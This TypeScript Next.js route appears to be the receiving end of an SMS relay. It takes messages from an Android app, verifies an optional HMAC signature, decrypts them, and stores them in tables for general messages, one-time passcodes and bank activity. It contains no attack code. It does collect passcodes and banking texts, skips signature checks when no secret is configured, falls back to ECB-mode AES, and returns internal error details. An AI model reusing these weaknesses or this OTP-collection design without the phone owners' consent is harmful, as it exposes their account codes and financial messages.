import { NextRequest, NextResponse } from "next/server";
import { getSupabase } from "@/lib/supabase";
import crypto from "crypto";

export async function GET(req: NextRequest) {
    return NextResponse.json({
        status: "online",
        message: "SMS Relay Webhook Endpoint. Please send a POST request with the appropriate JSON payload."
    });
}

export async function POST(req: NextRequest) {
        let responsePayload: any = { error: "Unknown error" };
        let statusCode: number = 500;
        let isSuccess: boolean = false;
        let rawBody = "";

        const logRequest = async (payload: any, statusStr: string, errorStr?: string) => {
            const supabase = getSupabase();
            const redacted = payload ? { ...payload } : null;
            if (redacted) {
                if (redacted.body) redacted.body = typeof redacted.body === 'string' ? redacted.body.substring(0, 8) + "...[REDACTED]" : redacted.body;
                if (redacted.sender) redacted.sender = typeof redacted.sender === 'string' ? redacted.sender.substring(0, 4) + "...[REDACTED]" : redacted.sender;
                if (redacted.metadata?.code) redacted.metadata.code = "***";
            }
            await supabase.from('webhook_logs').insert([{
                id: crypto.randomUUID(),
                status: statusStr,
                payload: redacted,
                error: errorStr || null,
                created_at: new Date().toISOString()
            }]);
        };

        try {
            rawBody = await req.text();
            
            const secret = process.env.APP_HMAC_SECRET;

            if (secret) {
                const signature = req.headers.get("x-hmac-signature") || req.headers.get("x-signature");

                if (!signature) {
                    await logRequest(null, "error", "Missing HMAC signature");
                    return NextResponse.json({ error: "Missing HMAC signature" }, { status: 401 });
                }

                const expectedSignature = crypto
                    .createHmac("sha256", secret)
                    .update(rawBody)
                    .digest("hex");

                try {
                    if (
                        signature.length !== expectedSignature.length ||
                        !crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature))
                    ) {
                        await logRequest(null, "error", "Invalid HMAC signature");
                        return NextResponse.json({ error: "Invalid HMAC signature" }, { status: 401 });
                    }
                } catch (e) {
                    await logRequest(null, "error", "Invalid HMAC signature");
                    return NextResponse.json({ error: "Invalid HMAC signature" }, { status: 401 });
                }
            }

            const body = JSON.parse(rawBody);
            const { type = 'message', sender, time, metadata } = body;
            let messageBody = body.body;

            if (!sender || !messageBody) {
                await logRequest(body, "error", "Missing required fields: sender, body");
                return NextResponse.json({ error: "Missing required fields: sender, body" }, { status: 400 });
            }

            const aesKey = process.env.APP_AES_PASSWORD || process.env.APP_AES_KEY;
            if (aesKey && typeof messageBody === 'string') {
                try {
                    let decryptedText = "";
                    
                    if (messageBody.includes(':')) {
                        // New format from Android App with explicit IV: "ivHex:cipherHex"
                        const [ivHex, cipherHex] = messageBody.split(':');
                        
                        const iv = Buffer.from(ivHex, 'hex');
                        const encryptedBytes = Buffer.from(cipherHex, 'hex');
                        
                        const key = crypto.createHash('sha256').update(aesKey).digest();
                        
                        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                        let decrypted = decipher.update(encryptedBytes);
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        
                        decryptedText = decrypted.toString('utf8');
                    } else {
                        // Fallback to CryptoJS for old formats if necessary
                        const CryptoJS = require("crypto-js");
                        let safeBase64 = messageBody.replace(/\s+/g, '');
                        if (messageBody.includes(' ')) {
                            safeBase64 = messageBody.replace(/ /g, '+').replace(/\n|\r/g, '');
                        }
                        
                        try {
                            decryptedText = CryptoJS.AES.decrypt(safeBase64, aesKey).toString(CryptoJS.enc.Utf8);
                        } catch (e: any) {}
                        
                        if (!decryptedText) {
                            try {
                                const key = CryptoJS.SHA256(aesKey);
                                decryptedText = CryptoJS.AES.decrypt(safeBase64, key, {
                                    mode: CryptoJS.mode.ECB,
                                    padding: CryptoJS.pad.Pkcs7
                                }).toString(CryptoJS.enc.Utf8);
                            } catch (e: any) {}
                        }
                        
                        if (!decryptedText) {
                            throw new Error("Invalid payload format or decryption failed. Expected new format 'ivHex:cipherHex'.");
                        }
                    }

                    if (!decryptedText) {
                        throw new Error("Empty decryption result.");
                    }
                    messageBody = decryptedText;
                } catch (e: any) {
                    await logRequest(body, "error", "AES Decryption failed: " + e.message);
                    return NextResponse.json({ 
                        error: "Failed to decrypt message body with AES key",
                        details: e.message || String(e),
                        hint: "Ensure the Android app uses the latest explicit IV format (ivHex:cipherHex) and the AES password matches exactly."
                    }, { status: 400 });
                }
            }

            const supabase = getSupabase();
            
            // Define table based on payload type
            let tableName = 'messages';
            if (type === 'otp') {
                tableName = 'otp_messages';
            } else if (type === 'bank') {
                tableName = 'bank_activity';
            }

            const payload: any = {
                id: crypto.randomUUID(),
                sender,
                body: messageBody,
                time: time || new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                created_at: new Date().toISOString()
            };

            if (tableName === 'otp_messages' || tableName === 'bank_activity') {
                payload.metadata = metadata || null;
            } else {
                payload.status = "Delivered";
                payload.metadata = metadata || null;
            }

            const { error } = await supabase.from(tableName).insert([payload]);

            if (error) {
                console.error("Supabase insert error:", error);
                await logRequest(body, "error", `Database error: ${error.message}`);
                return NextResponse.json({ error: "Database error", details: error }, { status: 500 });
            }

            await logRequest(body, "success");
            return NextResponse.json({ success: true, message: "Payload processed successfully" }, { status: 201 });
        } catch (error: any) {
            console.error("Webhook Error:", error);
            await logRequest(rawBody ? { raw: rawBody } : null, "error", error.message || "Internal server error");
            return NextResponse.json(
                { error: error.message || "Internal server error" },
                { status: 500 }
            );
        }
}
